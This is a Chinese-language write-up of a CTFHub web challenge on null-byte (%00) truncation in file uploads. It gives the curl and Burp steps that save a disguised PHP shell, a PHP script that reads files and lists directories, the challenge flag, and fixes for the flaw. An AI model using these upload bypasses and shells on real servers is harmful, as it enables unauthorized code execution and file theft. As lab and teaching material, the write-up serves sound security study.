# CTFHub Writeup - 00截断

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 文件上传 - 00 截断 |
| 靶场地址 | `http://challenge-c3df5b0530ded38d.sandbox.ctfhub.com:10800` |
| 漏洞类型 | 文件上传（路径前缀可控 + 空字节截断） |
| 关键参数 | GET `road`，作为保存路径的前缀 |
| 绕过方式 | `road=/var/www/html/upload/shell.php%00` |
| Flag | `ctfhub{6088fbc884eb2e3618d8cc1a}` |
## 0x02 漏洞原理
「00 截断」利用的是 C 语言字符串以 `\0` 结尾这一特性。
PHP 底层很多函数是用 C 实现的，处理路径时会调用 C 的字符串函数。C 遇到 `\0` 就认为字符串结束了，于是：
```
/var/www/html/upload/shell.php\0/1234.jpg
```
在 C 看来只有前面这一段：
```
/var/www/html/upload/shell.php
```
后面的 `/1234.jpg` 被直接忽略。
本题的源码就写在页面注释里：
```php
$name = basename($_FILES['file']['name']);
$info = pathinfo($name);
$ext = $info['extension'];
$whitelist = array("jpg", "png", "gif");
if (in_array($ext, $whitelist)) {
    $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
    if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {
        ...
```
拆开看：
- 扩展名白名单只允许 `jpg`、`png`、`gif`，所以文件名要伪装成图片；
- 真正的保存路径是 `$_GET['road']` 拼上随机数、时间戳和扩展名；
- `road` 完全由用户控制，这就是注入点。
如果让 `road` 以 `shell.php\0` 结尾，拼接出来的路径就是 `shell.php\0/123456.jpg`，被截断成 `shell.php`，文件就存成了 PHP。
## 0x03 解题过程
**3.1 看页面与源码**
首页表单的 `action` 里直接写着：
```html
<form action=?road=/var/www/html/upload/ method="post" enctype="multipart/form-data">
```
页面注释里还有完整的处理逻辑（见 0x02），可以看到 `road` 会被拼进保存路径，扩展名白名单只检查上传文件名的后缀。
**3.2 正常上传**
先传一个普通文件试试：
```
curl -F "file=@shell.php;filename=a.jpg" -F "submit=Submit" \
  "http://challenge-.../?road=/var/www/html/upload/"
```
返回「上传成功」。文件名伪装成 `a.jpg`，扩展名在白名单里，所以通过了；保存到 `upload/` 下，名字是随机数加时间戳，不可控。
**3.3 构造 00 截断**
把 `road` 改成以 `shell.php` 加空字节结尾：
```
http://challenge-.../?road=/var/www/html/upload/shell.php%00
```
`%00` 在 URL 里是空字节，PHP 的 `$_GET` 会把它解码成真正的 `\0`。
拼接后的路径是：
```
/var/www/html/upload/shell.php\0/123456.jpg
```
C 字符串在这里截断，最终写入的文件就是：
```
/var/www/html/upload/shell.php
```
上传：
```
curl -F "file=@shell.php;filename=a.jpg" -F "submit=Submit" \
  "http://challenge-.../?road=/var/www/html/upload/shell.php%00"
```
返回「上传成功」。
**3.4 验证执行**
访问：
```
http://challenge-.../upload/shell.php
```
返回：
```
PWNED_OK
```
文件确实按 `shell.php` 保存并被 PHP 解析，拿到代码执行入口。
**3.5 找 flag**
再传一个读文件的脚本，同样用 00 截断保存成 `read.php`：
```php
<?php
$p = @$_GET["p"]; echo "R:" . @file_get_contents($p);
$d = @$_GET["d"]; if ($d != "") { echo "D:"; print_r(@scandir($d)); }
?>
```
上传时 `road=/var/www/html/upload/read.php%00`，然后列 Web 根目录：
```
/upload/read.php?d=/var/www/html
```
回显：
```
Array
(
    [0] => .
    [1] => ..
    [2] => flag_111591454.php
    [3] => index.php
    [4] => upload
)
```
根目录下有一个随机命名的 `flag_111591454.php`。直接访问是空响应，因为内容整段是 PHP 注释：
```php
<?php // ctfhub{6088fbc884eb2e3618d8cc1a}
```
必须读源码：
```
/upload/read.php?p=/var/www/html/flag_111591454.php
```
回显：
```
R:<?php // ctfhub{6088fbc884eb2e3618d8cc1a}
```
拿到 Flag：
```
ctfhub{6088fbc884eb2e3618d8cc1a}
```
**3.6 用 Burp 改包**
浏览器正常上传 `a.jpg`，Burp 抓到请求后，把请求行从：
```
POST /?road=/var/www/html/upload/ HTTP/1.1
```
改成：
```
POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1
```
请求体不用动，直接放行。注意 `%00` 要写在 URL 里让服务端解码，不要把它当两个普通字符再编码一次。
**3.7 验证**
- 上传文件名用 `a.jpg`，扩展名在白名单里，能过校验；
- `road` 加 `%00` 后文件确实保存成 `shell.php` 并执行；
- flag 文件内容与回显一致，长度为 32。
## 0x04 完整流程
| 步骤 | 操作 | 结果 |
| --- | --- | --- |
| 看源码 | 页面注释泄露处理逻辑 | `road` 可控、扩展名白名单 |
| 正常上传 | `a.jpg` + 默认 `road` | 随机文件名，不可控 |
| 00 截断 | `road=.../shell.php%00` | 路径在空字节处截断 |
| 上传 | `a.jpg` 内容是 PHP | 保存为 `shell.php` |
| 验证执行 | 访问 `/upload/shell.php` | `PWNED_OK` |
| 找 flag | `scandir('/var/www/html')` | `flag_111591454.php` |
| 读源码 | `file_get_contents` | `<?php // ctfhub{...}` |
整条链路可以概括为：**发现保存路径前缀可控 → 在 `road` 末尾加 `%00` 截断 → 文件名伪装成图片过白名单 → 实际保存成 `.php` → 执行并读 flag。**
## 0x05 踩坑记录
1. **`%00` 要 URL 编码**：不能直接发原始空字节，必须写成 `%00`，让服务端在解析 GET 时解码成 `\0`。
2. **文件名扩展名要在白名单里**：上传时用 `filename=a.jpg`，内容却是 PHP；如果直接叫 `shell.php`，会先被 `in_array($ext, $whitelist)` 拦下，提示「文件类型不匹配」。
3. **截断点放在 `road` 末尾**：最终路径是 `road + "/" + 随机数 + 时间戳 + "." + ext`，所以 `road` 要写成 `.../shell.php%00`，后面的随机部分才会被丢掉。
4. **PHP 版本决定能不能截断**：PHP 5.3.4 之后，很多文件函数会拒绝包含空字节的路径；本题环境仍能截断，遇到新环境要先试。
5. **上传目录能解析 PHP**：这是 getshell 的关键，目录禁止执行的话，截断也没用。
6. **flag 文件直接访问是空的**：`flag_*.php` 的内容是 `<?php // ctfhub{...}`，整行被注释，必须读源码。
7. **源码就在页面注释里**：这题把处理逻辑直接写在了 HTML 注释中，先看源码能省很多试错。
## 0x06 修复建议
1. **不要用用户可控的路径前缀**：保存目录应该是服务端固定的常量，不能从 `$_GET['road']` 这类参数里取。
2. **随机重命名 + 白名单后缀**：保存名由服务端生成，只保留白名单扩展名，丢弃用户文件名。
3. **上传目录禁止执行**：Nginx/Apache 对 `upload/` 关闭 PHP 解析，或把目录放到 Web 根之外。
4. **升级 PHP**：PHP 5.3.4 之后已拒绝空字节路径，保持版本更新能直接消除这类问题。
5. **校验真实内容**：用 `finfo_file()` 或 `getimagesize()` 辅助判断，但不能替代目录禁执行。
6. **分离存储**：上传文件放独立域名或对象存储，配合鉴权下载。
## 0x07 总结
00 截断的核心是「路径拼接 + C 字符串特性」：
- 保存路径由 `road` 前缀和随机后缀拼成；
- 在 `road` 末尾插入 `\0`，C 字符串到此为止，后缀全部失效；
- 文件名伪装成图片过扩展名白名单，实际落盘却是 `.php`。
防御上，最直接的是别让用户控制保存路径；再加上服务端重命名、目录禁执行和 PHP 版本更新，这类漏洞就很难再出现了。
